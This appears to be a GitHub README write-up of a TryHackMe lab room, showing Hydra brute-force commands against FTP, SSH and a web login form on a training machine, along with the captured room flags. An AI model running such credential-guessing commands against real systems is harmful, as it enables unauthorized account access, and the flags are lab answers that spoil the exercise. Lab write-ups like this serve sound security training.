## 🛡️ TryHackMe Room - Hydra Brute-Force

My hands-on experience using **Hydra**, a powerful tool for brute-forcing credentials across multiple protocols. This project highlights my ability to analyze login mechanisms, craft attack strategies, and extract flags from deployed machines.

---

### 🔧 Tools & Environment

- **Hydra** – Network login cracker
- **rockyou.txt** – Popular password wordlist
- **Linux CLI** – Command-line execution
- **Browser Dev Tools** – For inspecting web form requests
- **Target IP** – `10.10.112.60`

---

### ⚔️ Attack Scenarios

#### 1️⃣ FTP Brute Force

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ftp://10.10.112.60
```

- Protocol: FTP
- Username: `molly`
- Wordlist: `rockyou.txt`

#### 2️⃣ SSH Brute Force

```bash
hydra -l molly -P passwords.txt 10.10.112.60 -t 4 ssh
```

- Protocol: SSH
- Username: `molly`
- Threads: 4
- Wordlist: `passwords.txt`

#### 3️⃣ Web Form (POST) Brute Force

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.112.60 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- Protocol: HTTP POST
- Login page: `/`
- Failure string: `F=incorrect`
- Verbose output enabled

---

### 🏁 Flags Captured

| Target | Method | Flag |
|--------|--------|------|
| Molly's Web Login | HTTP POST Form | `THM{2673a7dd116de68e85c48ec0b1f2612e}` |
| Molly's SSH Login | SSH Protocol | `THM{c8eeb0468febbadea859baeb33b2541b}` |

---

### 📚 Key Takeaways

- Hydra supports multiple protocols including FTP, SSH, and HTTP
- Understanding form structure and failure responses is critical for web brute-forcing
- Threading (`-t`) improves speed but must be balanced with server load
- Using verbose mode (`-V`) helps monitor progress and debug issues

---

### 🚀 Future Goals

- Automate brute-force workflows with Bash scripting
- Integrate Hydra with reporting tools for audit logs
- Explore advanced Hydra modules and plugins

---

### 🤝 Let’s Connect

If you're working on similar red team or penetration testing projects, feel free to fork this repo, share feedback, or collaborate!

